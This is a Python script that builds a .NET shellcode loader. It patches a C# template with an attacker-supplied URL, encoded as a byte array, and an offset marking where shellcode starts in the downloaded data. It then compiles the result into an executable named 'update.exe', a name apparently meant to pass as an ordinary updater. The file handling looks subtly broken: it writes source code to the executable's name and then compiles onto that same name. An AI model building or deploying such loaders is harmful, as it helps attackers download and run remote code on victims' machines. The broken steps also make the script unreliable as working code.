#!/usr/bin/env python3

import argparse
import os
import shutil
import subprocess

def str_to_byte_array(input_str):
    return ', '.join(f'0x{b:02x}' for b in input_str.encode())

def main():
    parser = argparse.ArgumentParser(description="Adjust and compile .NET Shellcode Loader")
    parser.add_argument("url", help="Url to embed")
    parser.add_argument("offset", help="Offset value", type=lambda x: int(x, 16))
    args = parser.parse_args()

    template_path = "~/tools/loader_templates/win_remote_sc.cs" # adjust path to your template
    output_path = "update.exe" # adjust name of output executeable

    if not os.path.exists(template_path):
        print(f"Template not found: {template_path}")
        return

    with open(template_path, "r") as f:
        content = f.read()

    content = content.replace("0xdeadbeef", hex(args.offset)) # placeholder for offset value in download where sc begins
    byte_array = str_to_byte_array(args.url) 
    content = content.replace("0xcafebabe", byte_array) # placeholder for url where sc is downloaded

    with open(output_path, "w") as f:
        f.write(content)
    print(f"Modified file saved to {output_path}")

    try:
        subprocess.run(["mcs", "-out:update.exe", output_path], check=True)
    except subprocess.CalledProcessError:
        print("Compilation failed. Is 'mcs' installed on your system?")

if __name__ == "__main__":
    main()
